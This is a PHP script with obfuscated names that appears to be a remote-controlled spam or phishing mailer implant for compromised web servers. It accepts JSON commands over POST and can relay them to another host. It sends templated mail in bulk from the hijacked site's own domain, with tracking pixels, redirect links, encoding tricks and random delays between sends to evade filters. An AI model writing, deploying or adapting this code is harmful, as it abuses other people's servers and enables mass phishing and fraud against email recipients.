<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); @error_reporting(0); @ini_set('display_errors', 0); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($sp78d60f) { if ($sp78d60f == 'keys') { return array_keys($this->_keys); } } public function Import($sp78d60f, $sp2542b9) { if (is_array($sp2542b9)) { $this->values[$sp78d60f] = array(); foreach ($sp2542b9 as $sp80fb58) { if (!empty($sp80fb58['key'])) { $this->values[$sp78d60f][$sp80fb58['key']] = $sp80fb58['value']; } else { $this->values[$sp78d60f][] = $sp80fb58['value']; } } } else { $this->Assign($sp78d60f, $sp2542b9); } } public function Assign($sp78d60f, $spf99b28) { $this->values[$sp78d60f] = $spf99b28; } public function Parse($spabf097) { $sp1e41eb = ''; $spa4c714 = 0; while (true) { $sp8e7c4b = strpos($spabf097, '{', $spa4c714); if ($sp8e7c4b === false) { $sp1e41eb .= substr($spabf097, $spa4c714); break; } $sp1e41eb .= substr($spabf097, $spa4c714, $sp8e7c4b - $spa4c714); $spa4c714 = $sp8e7c4b + 1; $spf44c1f = ''; $spf903ec = '{'; $spb7d54e = array(); $spb5f3ea = false; $sp692c86 = false; $spfda403 = 'var'; while ($spa4c714 < strlen($spabf097)) { $spe9afd3 = substr($spabf097, $spa4c714, 1); $spf903ec .= $spe9afd3; if ($spe9afd3 == ',' || $spe9afd3 == '>' || $spe9afd3 == '|') { if ($spfda403 == 'alias') { $spb5f3ea = $spf44c1f; } elseif ($spfda403 == 'mod') { $sp692c86 = $spf44c1f; } else { $spb7d54e[] = $spf44c1f; } $spf44c1f = ''; if ($spe9afd3 == '>') { $spfda403 = 'alias'; } if ($spe9afd3 == '|') { $spfda403 = 'mod'; } $spa4c714++; continue; } if ($spe9afd3 == '}') { if ($spfda403 == 'alias') { $spb5f3ea = $spf44c1f; } elseif ($spfda403 == 'mod') { $sp692c86 = $spf44c1f; } else { $spb7d54e[] = $spf44c1f; } $spa4c714++; break; } $spf44c1f .= $spe9afd3; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $spe9afd3) == 0) { $spa4c714++; $spb7d54e = array(); break; } $spa4c714++; } if (sizeof($spb7d54e) == 0) { $sp1e41eb .= $spf903ec; continue; } $sp4001d3 = false; $sp4d4d6b = false; if (preg_match('/^\\^/', $spb7d54e[0]) > 0) { $spb7d54e[0] = substr($spb7d54e[0], 1); $sp4001d3 = true; } if (preg_match('/^\\!/', $spb7d54e[0]) > 0) { $spb7d54e[0] = substr($spb7d54e[0], 1); $sp4d4d6b = true; } $sp4278cf = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $spb7d54e[0], $sp722f2a) > 0) { $sp4278cf = $sp722f2a[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $spb7d54e[0], $sp722f2a) > 0) { $sp4278cf = explode('-', $sp722f2a[1]); } if ($sp4278cf !== false) { $spb7d54e[0] = substr($spb7d54e[0], 0, strpos($spb7d54e[0], '[')); } $this->_keys[$spb7d54e[0]] = true; if (empty($this->values[$spb7d54e[0]]) && empty($this->fixed[$spb7d54e[0]])) { continue; } if ($sp4001d3) { unset($this->fixed[$spb7d54e[0]]); } if (isset($this->fixed[$spb7d54e[0]])) { $spa01442 = $this->fixed[$spb7d54e[0]]; } else { $spa01442 = ''; $sp9fa43a = 1; if (sizeof($spb7d54e) == 2) { $sp9fa43a = $spb7d54e[1]; } if (sizeof($spb7d54e) == 3) { $sp9fa43a = rand($spb7d54e[1], $spb7d54e[2]); } for ($sp1d5426 = 0; $sp1d5426 < $sp9fa43a; $sp1d5426++) { if (is_array($this->values[$spb7d54e[0]])) { if (!is_array($this->used[$spb7d54e[0]])) { $this->used[$spb7d54e[0]] = array(); } if (count($this->used[$spb7d54e[0]]) == count($this->values[$spb7d54e[0]])) { $this->used[$spb7d54e[0]] = array(); } if ($sp4278cf !== false && is_scalar($sp4278cf)) { $spa01442 .= $this->values[$spb7d54e[0]][$sp4278cf]; $this->used[$sp4278cf] = true; } else { $spa9bc4b = array(); if (is_array($sp4278cf)) { $sp5aff3c = $sp4278cf[0]; $sp92da9f = $sp4278cf[1]; } else { $sp5aff3c = 0; $sp92da9f = count($this->values[$spb7d54e[0]]) - 1; } for ($spd97278 = $sp5aff3c; $spd97278 <= $sp92da9f; $spd97278++) { if ($sp4d4d6b && !empty($this->used[$spb7d54e[0]][$spd97278])) { continue; } $spa9bc4b[] = $spd97278; } $sp0132c5 = $spa9bc4b[rand(0, count($spa9bc4b) - 1)]; $this->used[$spb7d54e[0]][$sp0132c5] = true; $spa01442 .= $this->values[$spb7d54e[0]][$sp0132c5]; } } else { $spa01442 .= $this->values[$spb7d54e[0]]; } } } $spa01442 = $this->Parse($spa01442); if ($sp692c86 !== false) { for ($spbfc2a1 = 0; $spbfc2a1 < strlen($sp692c86); $spbfc2a1++) { switch (substr($sp692c86, $spbfc2a1, 1)) { case 'b': $spa01442 = base64_encode($spa01442); break; case 'q': $spa01442 = quoted_printable_encode($spa01442); break; default: break; } } } if ($sp4001d3) { $this->fixed[$spb7d54e[0]] = $spa01442; } if ($spb5f3ea !== false && $spb5f3ea != '') { $this->fixed[$spb5f3ea] = $spa01442; } $sp1e41eb .= $spa01442; } return $sp1e41eb; } } $spd24731 = file_get_contents('php://input'); $spa5738a = json_decode($spd24731, true); if (empty($spa5738a['via_proxy'])) { $spa5738a['via_proxy'] = true; $spe02871 = curl_init($spa5738a['prefix'] . $spa5738a['files']['s']); $sp8c5504 = json_encode($spa5738a); curl_setopt($spe02871, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($spe02871, CURLOPT_TIMEOUT, 600); curl_setopt($spe02871, CURLOPT_RETURNTRANSFER, true); curl_setopt($spe02871, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($spe02871, CURLOPT_REFERER, $spfefa39); curl_setopt($spe02871, CURLOPT_POST, true); curl_setopt($spe02871, CURLOPT_POSTFIELDS, $sp8c5504); curl_setopt($spe02871, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp8c5504))); $sp560342 = curl_exec($spe02871); echo $sp560342; die; } $sp62102b = $_SERVER['SERVER_ADDR']; $sp225040 = $_SERVER['HTTP_HOST']; $sp225040 = preg_replace('/^www\\./', '', $sp225040); $sp76ff33 = new Macros(); $sp76ff33->Assign('server_addr', $sp62102b); $sp76ff33->Assign('server_host', $sp225040); foreach ($spa5738a['macros'] as $sp78d60f => $sp2542b9) { $sp76ff33->Import($sp78d60f, $sp2542b9); } $sp27e5ca = preg_replace('/^www\\./i', '', $sp225040); $sp49dbd2 = $sp76ff33->Parse('{from_user}@' . $sp27e5ca); $sp76ff33->Assign('from_email', $sp49dbd2); $sp76ff33->Assign('prefix', $spa5738a['prefix']); $sp76ff33->Assign('html', $spa5738a['letter']['html']); $spa4c714 = 0; $spbd90de = 0; $sp4bc757 = 0; $spda11bd = array(); foreach ($spa5738a['rcpt'] as $sp84fb41) { $sp76ff33->Assign('email', $sp84fb41['email']); $sp76ff33->Assign('entry', $sp84fb41); $sp76ff33->Assign('date', date('r')); $sp76ff33->Assign('redirect', $spa5738a['prefix'] . $spa5738a['files']['r']); $sp76ff33->Assign('redirect_with_uri', $spa5738a['prefix'] . $spa5738a['files']['r'] . '?uri='); $sp76ff33->Assign('unsubscribe', $spa5738a['prefix'] . $spa5738a['files']['u'] . '?id=' . $sp84fb41['id']); $sp76ff33->Assign('delivery', '<img src="' . $spa5738a['prefix'] . $spa5738a['files']['d'] . '?id=' . $sp84fb41['id'] . '" />'); $sp86c015 = $sp76ff33->Parse($spa5738a['envelope']['header']); $spdbab81 = $sp76ff33->Parse($spa5738a['envelope']['body']); if (!empty($sp84fb41['name'])) { $sp8b6ef0 = $sp84fb41['name'] . ' <' . $sp84fb41['email'] . '>'; } else { $sp8b6ef0 = $sp84fb41['email']; } $sp8cfd77 = $sp76ff33->Parse($spa5738a['letter']['subject']); if ($spa4c714 > 0) { sleep(rand(3, 8)); } $sp36a671 = mail($sp8b6ef0, $sp8cfd77, $spdbab81, $sp86c015); $spda11bd[$sp84fb41['id']] = $sp36a671; if ($sp36a671) { $spbd90de++; } else { $sp4bc757++; } $spa4c714++; } echo serialize(array('total' => count($spa5738a['rcpt']), 'sent' => $spa4c714, 'success' => $spbd90de, 'error' => $sp4bc757, 'rcpt' => $spda11bd));